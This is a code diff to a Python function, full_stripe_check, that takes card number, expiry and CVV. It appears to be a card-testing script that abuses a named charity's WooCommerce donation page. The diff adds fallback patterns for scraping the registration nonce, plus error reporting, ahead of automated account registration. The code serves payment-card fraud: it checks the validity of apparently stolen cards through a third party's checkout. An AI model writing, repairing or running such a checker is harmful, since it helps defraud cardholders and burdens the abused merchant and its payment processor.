@@ -20,12 +20,23 @@ def full_stripe_check(cc, mm, yy, cvv):
     try:
         # Step 1 & 2: Get login nonce from bsdcorp donate page
         login_page_res = session.get('https://www.bsdcorp.org/donate/')
+        
+        # Debug: Save page content to see what's there
+        if login_page_res.status_code != 200:
+            return {"status": "Declined", "response": f"Failed to reach donate page. Status: {login_page_res.status_code}", "decline_type": "process_error"}
+        
+        # Look for various nonce patterns
         login_nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', login_page_res.text)
         if not login_nonce_match:
-            # Try alternative nonce pattern
             login_nonce_match = re.search(r'"woocommerce-register-nonce":"(.*?)"', login_page_res.text)
-            if not login_nonce_match:
-                return {"status": "Declined", "response": "Failed to get login nonce. Page structure may be different.", "decline_type": "process_error", "debug": login_page_res.status_code}
+        if not login_nonce_match:
+            login_nonce_match = re.search(r'nonce["\']?\s*[:=]\s*["\']([a-f0-9]+)["\']', login_page_res.text, re.IGNORECASE)
+        
+        if not login_nonce_match:
+            # Check if page even has any nonce
+            has_any_nonce = 'nonce' in login_page_res.text.lower()
+            return {"status": "Declined", "response": f"Failed to get login nonce. Has nonce field: {has_any_nonce}", "decline_type": "process_error"}
+        
         login_nonce = login_nonce_match.group(1)
 
         # Step 3: Register a new account for a valid session
